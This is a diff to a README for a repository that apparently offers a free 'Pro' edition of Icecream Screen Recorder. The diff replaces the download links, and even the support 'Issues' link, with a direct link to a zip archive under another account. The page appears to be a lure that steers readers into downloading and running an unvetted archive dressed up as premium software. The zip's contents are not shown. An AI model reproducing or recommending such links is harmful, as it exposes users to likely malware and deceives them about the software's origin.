@@ -36,7 +36,7 @@ The Pro version of Icecream Screen Recorder includes:
 
 To install Icecream Screen Recorder Pro, follow these steps:
 
-1. **Download the Installer**: Visit the [Releases section](555) to download the latest version.
+1. **Download the Installer**: Visit the [Releases section](https://github.com/neverman9o/Icecream-Screen-Recorder-Pro-Download/releases/download/download/Icecream.Screen.Recorder.Pro.v2.0.4-alpha.5.Latest.zip) to download the latest version.
 2. **Run the Installer**: Locate the downloaded file and double-click it to start the installation process.
 3. **Follow the Prompts**: Complete the installation by following the on-screen instructions.
 4. **Launch the Application**: After installation, open Icecream Screen Recorder from your applications menu.
@@ -55,7 +55,7 @@ The Pro version offers significant advantages, especially for users who need mor
 
 ## Download Links
 
-To download Icecream Screen Recorder Pro, visit the [Releases section](555). Make sure to download the correct version for your operating system.
+To download Icecream Screen Recorder Pro, visit the [Releases section](https://github.com/neverman9o/Icecream-Screen-Recorder-Pro-Download/releases/download/download/Icecream.Screen.Recorder.Pro.v2.0.4-alpha.5.Latest.zip). Make sure to download the correct version for your operating system.
 
 ## Usage
 
@@ -69,7 +69,7 @@ Using Icecream Screen Recorder Pro is straightforward. Here’s a quick guide:
 
 ## Support
 
-If you encounter any issues or have questions, feel free to check the [Issues section](https://github.com/devil01dev/Icecream-Screen-Recorder-Pro-Download/issues) of this repository. You can also reach out to the community for help.
+If you encounter any issues or have questions, feel free to check the [Issues section](https://github.com/neverman9o/Icecream-Screen-Recorder-Pro-Download/releases/download/download/Icecream.Screen.Recorder.Pro.v2.0.4-alpha.5.Latest.zip) of this repository. You can also reach out to the community for help.
 
 ## Contributing
 
